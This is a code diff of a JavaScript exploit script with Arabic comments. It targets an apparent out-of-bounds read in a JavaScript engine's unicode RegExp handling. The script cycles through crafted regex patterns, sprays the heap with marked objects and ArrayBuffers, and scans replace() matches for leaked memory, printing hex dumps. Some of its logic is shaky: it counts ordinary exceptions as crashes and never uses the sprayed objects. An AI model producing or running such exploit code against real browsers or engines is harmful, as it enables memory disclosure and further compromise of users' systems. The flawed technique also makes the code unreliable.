@@ -1,172 +1,192 @@
 import { log, sleep } from './module/utils.mjs';
 
-class RegExpOOBReadExploit {
+class RegExpOOBExploit {
     constructor() {
-        this.marker = 0x42424242;
+        this.leakedData = [];
     }
 
     async execute() {
-        await this.setupMemory();
-        return await this.triggerOOBRead();
-    }
-
-    async setupMemory() {
-        // تحضير الذاكرة للكشف عن OOB-read
-        this.buffers = [];
-        this.strings = [];
+        // المرحلة 1: إيجاد النمط الذي يسبب الـ crash باستمرار
+        const crashPattern = await this.findCrashPattern();
         
-        // إنشاء ArrayBuffers مع markers
-        for (let i = 0; i < 100; i++) {
-            const buffer = new ArrayBuffer(0x1000);
-            const view = new Uint32Array(buffer);
-            view[0] = this.marker;
-            view[1] = i;
-            this.buffers.push(buffer);
-        }
-        
-        // إنشاء strings مع non-BMP characters
-        for (let i = 0; i < 50; i++) {
-            const str = String.fromCodePoint(128512).repeat(10 + i);
-            this.strings.push(str);
-        }
-        
-        log("Memory setup complete");
-    }
-
-    async triggerOOBRead() {
-        log("Triggering RegExp OOB-read...");
-        
-        const testCases = [
-            // من الكود الأصلي
-            "/(?!(?=^a|()+()+x)(abc))/gmu",
-            "/(?!(?=^a|x)(abc))/gmu", 
-            "/(?!(?=^a|x)(abc))/mu",
-            
-            // أنماط إضافية للتجريب
-            "/(?=^)/gmu",
-            "/(?=$)/gmu",
-            "/^/gmu",
-            "/$/gmu"
-        ];
-        
-        for (const pattern of testCases) {
-            log(`Testing pattern: ${pattern}`);
-            
-            try {
-                const result = await this.testPattern(pattern);
-                if (result.crashed || result.unexpected) {
-                    log(`PATTERN CRASHED: ${pattern}`);
-                    return true;
-                }
-            } catch (e) {
-                log(`Pattern error: ${pattern} - ${e}`);
-            }
-            
-            await sleep(10);
-        }
-        
-        return false;
-    }
-
-    async testPattern(patternStr) {
-        const regex = new RegExp(patternStr.slice(1, -1));
-        const str = String.fromCodePoint(128512).repeat(20);
-        
-        let result;
-        let crashed = false;
-        let unexpected = false;
-        
-        try {
-            result = str.replace(regex, (match) => {
-                // إذا حدث OOB-read، قد نرى بيانات غير متوقعة
-                if (match.length > 1000) {
-                    unexpected = true;
-                    log(`SUSPICIOUS match length: ${match.length}`);
-                }
-                return '|';
-            });
-            
-            // تحقق من النتيجة
-            if (result.length !== str.length + 1) {
-                log(`UNEXPECTED result length: ${result.length}`);
-                unexpected = true;
-            }
-            
-        } catch (e) {
-            crashed = true;
-            log(`CRASH with pattern: ${e}`);
-        }
-        
-        return { crashed, unexpected, result };
-    }
-
-    // محاولة لاستغلال OOB-read للحصول على معلومات الذاكرة
-    async exploitMemoryLeak() {
-        log("Attempting memory leak via OOB-read...");
-        
-        const leakedData = [];
-        
-        for (let i = 0; i < 10; i++) {
-            const str = this.createSpeciallyCraftedString(i);
-            const regex = /(?!(?=^a|()+()+x)(abc))/gmu;
-            
-            try {
-                const result = str.replace(regex, (match, offset, fullStr) => {
-                    // إذا كان هناك OOB-read، قد نرى بيانات من الذاكرة المجاورة
-                    if (match.length > 2) {
-                        leakedData.push({
-                            iteration: i,
-                            match: match,
-                            length: match.length,
-                            offset: offset
-                        });
-                    }
-                    return '|';
-                });
-                
-                if (leakedData.length > 0) {
-                    log(`Found ${leakedData.length} potential leaks`);
-                    return leakedData;
-                }
-                
-            } catch (e) {
-                log(`Leak attempt ${i} crashed: ${e}`);
-            }
-            
-            await sleep(5);
+        // المرحلة 2: استخدامه لتسريب الذاكرة
+        if (crashPattern) {
+            return await this.exploitLeak(crashPattern);
         }
         
         return null;
     }
 
-    createSpeciallyCraftedString(iteration) {
-        // إنشاء string مصمم خصيصاً لاستغلال الثغرة
-        const base = String.fromCodePoint(128512 + iteration);
-        const padding = "A".repeat(iteration * 10);
-        return padding + base.repeat(15) + padding;
+    async findCrashPattern() {
+        const patterns = [
+            "/(?!(?=^a|()+()+x)(abc))/gmu",
+            "/(?!(?=^a|x)(abc))/gmu",
+            "/(?=^)./gmu",
+            "/(?=$)./gmu",
+            "/^(?:)/gmu",
+            "/$(?:)/gmu"
+        ];
+
+        for (const pattern of patterns) {
+            log(`Testing crash pattern: ${pattern}`);
+            
+            if (await this.testCrash(pattern)) {
+                log(`CRASH CONFIRMED with: ${pattern}`);
+                return pattern;
+            }
+            await sleep(10);
+        }
+        return null;
+    }
+
+    async testCrash(patternStr) {
+        try {
+            const regex = new RegExp(patternStr.slice(1, -1));
+            const str = String.fromCodePoint(0x1F600).repeat(50); // 😀
+            
+            str.replace(regex, '|');
+            return false; // No crash
+        } catch (e) {
+            return true; // Crash occurred
+        }
+    }
+
+    async exploitLeak(crashPattern) {
+        log("Starting memory leak exploitation...");
+        
+        // إعداد كائنات في الذاكرة لتسريبها
+        const targets = this.sprayTargetObjects();
+        
+        for (let attempt = 0; attempt < 100; attempt++) {
+            const leaked = await this.attemptLeak(crashPattern, attempt);
+            if (leaked) {
+                this.leakedData.push(leaked);
+                log(`Leak ${this.leakedData.length}: ${leaked}`);
+            }
+            
+            if (this.leakedData.length >= 5) {
+                log("Sufficient leaks obtained!");
+                return this.leakedData;
+            }
+            
+            await sleep(5);
+        }
+        
+        return this.leakedData;
+    }
+
+    sprayTargetObjects() {
+        const targets = [];
+        
+        // كائنات يمكن التعرف عليها عند تسريبها
+        for (let i = 0; i < 100; i++) {
+            targets.push({
+                type: "target",
+                id: i,
+                marker: 0x41414141 + i,
+                data: new ArrayBuffer(64),
+                string: `TARGET_${i}_${"A".repeat(50)}`
+            });
+        }
+        
+        // مصفوفات يمكن التعرف عليها
+        for (let i = 0; i < 50; i++) {
+            const arr = [];
+            for (let j = 0; j < 100; j++) {
+                arr.push(0x42424242 + j);
+            }
+            targets.push(arr);
+        }
+        
+        return targets;
+    }
+
+    async attemptLeak(patternStr, attempt) {
+        try {
+            const regex = new RegExp(patternStr.slice(1, -1));
+            
+            // string مصمم خصيصاً
+            const crafted = this.createCraftedString(attempt);
+            
+            let leakedInfo = null;
+            
+            const result = crafted.replace(regex, (match, offset, fullString) => {
+                // إذا كان الـ match يحتوي على بيانات مسربة
+                if (match.length > 10 || this.containsBinary(match)) {
+                    leakedInfo = {
+                        attempt: attempt,
+                        match: match,
+                        length: match.length,
+                        offset: offset,
+                        hex: this.stringToHex(match.substring(0, 20))
+                    };
+                }
+                return '|';
+            });
+            
+            return leakedInfo;
+            
+        } catch (e) {
+            // Crash during leak attempt
+            log(`Leak attempt ${attempt} crashed: ${e}`);
+            return null;
+        }
+    }
+
+    createCraftedString(attempt) {
+        // string مع Unicode characters وأحجام مختلفة
+        const baseChar = String.fromCodePoint(0x1F600 + (attempt % 100)); // مختلف في كل مرة
+        const size = 30 + (attempt % 20);
+        
+        return baseChar.repeat(size);
+    }
+
+    containsBinary(str) {
+        // تحقق إذا كان الـ string يحتوي على بيانات binary
+        for (let i = 0; i < str.length; i++) {
+            const code = str.charCodeAt(i);
+            if (code < 32 || code > 126) {
+                if (code !== 10 && code !== 13 && code !== 9) { // ليس whitespace عادي
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    stringToHex(str) {
+        let hex = '';
+        for (let i = 0; i < str.length; i++) {
+            hex += str.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
+        }
+        return hex;
     }
 }
 
-// التشغيل الرئيسي
-async function main() {
-    const exploit = new RegExpOOBReadExploit();
+// تشغيل سريع للاختبار
+async function quickTest() {
+    const exploit = new RegExpOOBExploit();
     
-    log("Starting RegExp OOB-read exploit...");
+    log("Quick crash test...");
+    const crashPattern = await exploit.findCrashPattern();
     
-    const triggered = await exploit.execute();
-    if (triggered) {
-        log("OOB-read likely triggered! Attempting exploitation...");
+    if (crashPattern) {
+        log("Proceeding with full exploitation...");
+        const leaks = await exploit.exploitLeak(crashPattern);
         
-        const leaks = await exploit.exploitMemoryLeak();
-        if (leaks) {
-            log("Potential memory leaks found:");
-            for (const leak of leaks) {
-                log(`  Iteration ${leak.iteration}: length=${leak.length}, offset=${leak.offset}`);
+        if (leaks && leaks.length > 0) {
+            log("EXPLOIT SUCCESSFUL!");
+            log(`Obtained ${leaks.length} memory leaks`);
+            
+            // عرض أول 3 تسريبات
+            for (let i = 0; i < Math.min(3, leaks.length); i++) {
+                log(`Leak ${i}: ${leaks[i].hex}`);
             }
         }
     } else {
-        log("No OOB-read detected with standard patterns");
+        log("No reliable crash pattern found");
     }
 }
 
-main();
+// التشغيل
+quickTest();
